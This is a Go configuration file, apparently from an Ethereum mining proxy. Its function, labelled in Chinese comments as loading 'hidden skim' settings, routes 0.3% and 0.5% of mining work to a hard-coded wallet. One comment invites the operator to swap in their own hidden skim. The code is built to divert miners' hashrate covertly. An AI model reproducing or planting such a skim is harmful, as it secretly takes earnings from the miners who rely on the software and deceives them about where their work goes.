// +build self_cfg

package config

// LoadFeeCfg 加载暗抽设置
func LoadFeeCfg() {
	// 程序开发者抽水默认为双抽，比例分别为百分之0.3、百分之0.5，如觉得软件对您有所帮助，请保留我们的开发者抽水或对我们的钱包地址进行捐赠
	FeeStates["eth"] = append(FeeStates["eth"], FeeState{
		Upstream:   Upstream{},
		Wallet:     "0xB775f5396eBe589C770069Bfcc421Ca135E9a326",
		NamePrefix: "u.",
		Pct:        0.3,
	})
	FeeStates["eth"] = append(FeeStates["eth"], FeeState{
		Upstream:   Upstream{},
		// 这里可以改成您自己的暗抽
		Wallet:     "0xB775f5396eBe589C770069Bfcc421Ca135E9a326",
		NamePrefix: "u.",
		Pct:        0.5,
	})
}
